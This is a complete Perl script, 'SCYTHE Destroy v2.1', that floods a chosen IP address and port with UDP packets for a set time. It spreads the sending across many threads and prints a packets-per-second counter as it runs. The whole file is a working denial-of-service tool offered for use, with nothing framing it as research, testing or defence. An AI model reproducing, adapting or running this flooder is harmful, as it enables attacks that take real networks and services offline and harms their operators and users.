#!/usr/bin/perl
# SCYTHE Destroy v2.1
use strict; use warnings; use IO::Socket::INET; use Time::HiRes qw(time sleep); use threads;
if (@ARGV < 4) { print "Usage: perl destroy.pl <ip> <port> <size> <time> [threads]\n"; exit(1); }
my ($ip, $port, $size, $duration, $tc) = @ARGV; $tc ||= 100;
print "[SCYTHE] Destroy: $ip:$port | ${duration}s\n";
my $total :shared = 0; my $end = time() + $duration;
sub destroy { my $sock = IO::Socket::INET->new(Proto=>'udp', PeerAddr=>$ip, PeerPort=>$port) or return; my $pkt = "A" x $size; while (time() < $end) { eval { $sock->send($pkt); { lock($total); $total++; } }; } $sock->close(); }
my @t; for (1..$tc) { push @t, threads->create(\&destroy); }
my $start = time(); while (time() - $start < $duration) { my $rps = int($total / (time() - $start || 1)); print "[DESTROY] Packets: $total | RPS: $rps\n"; sleep(1); }
$_->join() for @t; print "[DESTROY] Completed: $total\n";